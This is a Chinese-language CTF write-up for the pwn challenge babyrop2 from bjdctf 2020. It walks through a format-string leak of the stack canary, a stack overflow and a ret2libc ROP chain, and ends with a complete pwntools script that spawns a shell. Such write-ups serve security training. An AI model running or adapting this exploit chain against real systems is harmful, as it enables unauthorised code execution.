最近这段时间应该会陆陆续续补上以前做的pwn题的wp，再来复习一下
Involved Knowledge
Format String
Stackoverflow
ret2libcChecksec

Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)
64位，开启了Canary(金丝雀)和NX(堆栈不可执行)，那么如果有canary的话，我们在进行rop时首先就是要泄露canary
Analyzemainint __cdecl main(int argc, const char **argv, const char **envp)&#123;  init(argc, argv, envp);  gift();  vuln();  return 0;&#125;
main函数里面依次执行三个函数init(),gift(),vuln()，依次跟进
init()unsigned __int64 init()&#123;  unsigned __int64 v1; // [rsp+8h] [rbp-8h]  v1 = __readfsqword(0x28u);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 1, 0LL);  puts(&quot;Can u return to libc ?&quot;);  puts(&quot;Try u best!&quot;);  return __readfsqword(0x28u) ^ v1;&#125;
setvbuf进行了初始化了输入输出流该如何缓冲，将缓冲置零
gift()unsigned __int64 gift()&#123;  char format[8]; // [rsp+0h] [rbp-10h] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;I&#x27;ll give u some gift to help u!&quot;);  __isoc99_scanf(&quot;%6s&quot;, format);  printf(format);  puts(byte_400A05);  fflush(0LL);  return __readfsqword(0x28u) ^ v2;&#125;
__isoc99_scanf(&quot;%6s&quot;, format);
 printf(format);
这里有format string，我们可以尝试泄露出canary，通过gdb找到canary的偏移
unsigned __int64 vuln()&#123;  char buf[24]; // [rsp+0h] [rbp-20h] BYREF  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;Pull up your sword and tell me u story!&quot;);  read(0, buf, 0x64uLL);  return __readfsqword(0x28u) ^ v2;&#125;
这里是个stackoverflow，buf只有0x18大小，但是read的长度是0x64，我们可以在这里写ropchain
分析到这里结束
我们拿到canary后在rop时把canary放到它原来的位置上就行，后面跟上了p64(0)是因为还有8个字节才覆盖到返回地址，然后打ropchain
EXP    # Arch:     amd64-64-little    # RELRO:    Partial RELRO    # Stack:    Canary found    # NX:       NX enabled    # PIE:      No PIE (0x400000)from pwn import *from LibcSearcher import *context(os = &#x27;linux&#x27; , arch = &#x27;amd64&#x27; , log_level = &#x27;debug&#x27;)local = 1if local == 0:    io = remote(&#x27;1.14.71.254&#x27; , 28377)else:    io = process(&#x27;/mnt/c/Users/M1sceden4/Desktop/pwn/babyrop2_bjdctf_2020&#x27;)elf = ELF(&#x27;/mnt/c/Users/M1sceden4/Desktop/pwn/babyrop2_bjdctf_2020&#x27;)io.recvuntil(&quot;I&#x27;ll give u some gift to help u!\n&quot;)payload = b&#x27;%7$p&#x27;io.sendline(payload)canary = int(io.recv(18) , 16)success(&#x27;canary = &#x27; + hex(canary))puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]main = elf.sym[&#x27;main&#x27;]pop_rdi_ret = 0x0000000000400993ret = 0x00000000004005f9vuln = elf.sym[&#x27;vuln&#x27;]payload = b&#x27;a&#x27; * (0x20 - 0x8) + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)io.recvuntil(&#x27;Pull up your sword and tell me u story!\n&#x27;)io.sendline(payload)puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))success(&#x27;puts_addr = &#x27; + hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27; , puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)success(&#x27;libc_base = &#x27; + hex(libc_base))system = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)success(&#x27;system = &#x27; + hex(system))success(&#x27;bin_sh &#x27; + hex(bin_sh))payload = b&#x27;a&#x27; * (0x20 - 0x8) + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.recvuntil(&quot;I&#x27;ll give u some gift to help u!\n&quot;)io.sendline(&#x27;1&#x27;)io.recvuntil(&#x27;Pull up your sword and tell me u story!\n&#x27;)io.sendline(payload)io.interactive()
